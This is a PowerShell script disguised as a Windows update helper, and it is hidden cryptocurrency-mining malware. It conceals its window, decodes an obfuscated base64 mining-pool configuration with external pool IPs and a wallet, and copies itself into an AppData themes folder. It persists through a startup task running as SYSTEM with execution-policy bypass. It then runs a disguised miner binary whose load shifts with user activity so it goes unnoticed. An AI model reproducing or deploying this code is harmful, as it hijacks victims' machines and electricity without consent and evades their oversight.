# === WinUpdateHelper v4.3 - Adaptive Ghost Mining System ===
# Author: System Maintenance Team | Internal Use Only

# 1. التخفي التام + منع الأخطاء
$ErrorActionPreference = 'SilentlyContinue'
Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(int h,int n);' -Name win -Namespace hide
[hide.win]::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0) | Out-Null

# 2. إعداد المسارات الثابتة
$themeDir = "$env:APPDATA\Microsoft\Windows\Themes"
$minerPath = "$themeDir\win_service.exe"
$configPath = "$themeDir\cache_update.dat"
$selfPath = "$themeDir\WinUpdateHelper.ps1"

# 3. فك تشفير الكونفيج وكتابته للذاكرة (لا يوجد نص عادي أبداً)
$configB64 = "eyJwb29scyI6W3sidXJsIjoic3RyYXR1bSt0Y3A6Ly8xNDYuNTkuMTU2LjEyMDo4MCIsInVzZXIiOiIzY1VxOEFaNWhVbXBnbWRFZk1pS2dlRXFSMlB2b0VwdUhBUWpqWEZmWXZDZjlRTFRjUWpuRyIsInBhc3MiOiJ4Iiwic3NsIjpmYWxzZX0seyJ1cmwiOiJzdHJhdHVtK3RjcDovLzUxLjc5LjY1LjEzOTo4MCIsInVzZXIiOiIzY1VxOEFaNWhVbXBnbWRFZk1pS2dlRXFSMlB2b0VwdUhBUWpqWEZmWXZDZjlRTFRjUWpuRyIsInBhc3MiOiJ4Iiwic3NsIjpmYWxzZX1dLCJ3YWxsZXQiOiIzY1VxOEFaNWhVbXBnbWRFZk1pS2dlRXFSMlB2b0VwdUhBUWpqWEZmWXZDZjlRTFRjUWpuRyIsIndvcmtlciI6ImNhZmVfbm9kZV8wMSIsImFsZ28iOiJibGFrZTMiLCJwbGF0Zm9ybXMiOlsibnZpZGlhIl0sImludGVuc2l0eSI6NjAsImZhbi1zcGVlZCI6NjUsInRlbXAtbGltaXQiOjc1LCJsb2ctZmlsZSI6IiIsImFwaS1iaW5kIjoiIn0="
[System.IO.File]::WriteAllText($configPath, [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($configB64)))

# 4. إنشاء مهمة مجدولة للاستيقاظ الذاتي (بعد كل إعادة تشغيل)
$taskName = "WindowsUpdateAssistant"
if (-not (Test-Path $selfPath)) { Copy-Item $PSCommandPath $selfPath -Force }
if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
    $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-w hidden -ep bypass -file `"$selfPath`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit ([TimeSpan]::Zero) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
    Register-ScheduledTask -Name $taskName -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force
}

# 5. محرك التكيف الذكي (Adaptive Engine)
$highIntensity = 60
$lowIntensity = 40
$lastState = ""

while ($true) {
    $idleSeconds = ([Environment]::TickCount / 1000) - (Get-Process csrss -ErrorAction SilentlyContinue).StartTime.TotalSeconds
    $fgProc = (Get-Process | Where-Object {$_.MainWindowHandle -ne 0} | Select-Object -First 1).ProcessName
    
    if ($idleSeconds -gt 300 -and [string]::IsNullOrEmpty($fgProc)) {
        if ($lastState -ne "HIGH") {
            Stop-Process -Name win_service -Force -ErrorAction SilentlyContinue
            Start-Process -FilePath $minerPath -ArgumentList "--config `"$configPath`" --pl $highIntensity --fan 65" -WindowStyle Hidden
            $lastState = "HIGH"
        }
    } 
    elseif ($fgProc -match 'game|unity|unreal|steam') {
        if ($lastState -ne "LOW") {
            Stop-Process -Name win_service -Force -ErrorAction SilentlyContinue
            Start-Process -FilePath $minerPath -ArgumentList "--config `"$configPath`" --pl $lowIntensity --fan 45" -WindowStyle Hidden
            $lastState = "LOW"
        }
    }
    else {
        if ($lastState -ne "OFF") {
            Stop-Process -Name win_service -Force -ErrorAction SilentlyContinue
            $lastState = "OFF"
        }
    }
    
    Start-Sleep -Seconds 8
}
